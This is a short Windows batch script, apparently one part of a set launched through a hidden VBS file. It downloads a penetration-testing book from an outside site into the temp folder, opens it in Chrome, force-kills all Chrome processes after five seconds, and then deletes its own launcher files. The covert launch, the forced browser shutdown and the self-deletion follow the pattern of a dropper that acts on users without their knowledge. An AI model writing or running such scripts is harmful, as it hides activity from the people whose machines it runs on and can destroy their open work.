powershell -Command "Invoke-WebRequest https://doc.lagout.org/security/The-Hacker-Playbook-Practical-Guide-To-Penetration-Testing-2014.pdf -OutFile %temp%\book.pdf"
timeout 1
start  chrome.exe "%temp%\book.pdf"
timeout 5
taskkill /IM chrome.exe -F
del "%temp%\hide.vbs"
del "%temp%\main.bat"
exit
